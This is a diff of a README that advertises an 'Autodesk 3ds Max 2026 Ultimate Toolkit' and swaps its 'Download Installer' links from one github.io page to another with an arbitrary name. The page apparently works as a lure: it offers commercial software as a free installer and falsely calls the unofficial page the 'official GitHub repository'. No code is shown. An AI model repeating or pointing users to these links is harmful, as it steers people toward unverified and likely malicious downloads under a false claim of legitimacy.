@@ -2,7 +2,7 @@
 
 Discover the Autodesk 3ds Max 2026 Ultimate Toolkit, your all-in-one solution for boosting productivity and creativity in 3D design. This tool integrates advanced features to streamline your workflow on Windows 10 and 11, making it an essential companion for professionals and enthusiasts alike.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -75,7 +75,7 @@ Here are some common questions users have about the toolkit:
 
 To get started, download the latest version of the Autodesk 3ds Max 2026 Ultimate Toolkit from the official GitHub repository.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Last Updated
 
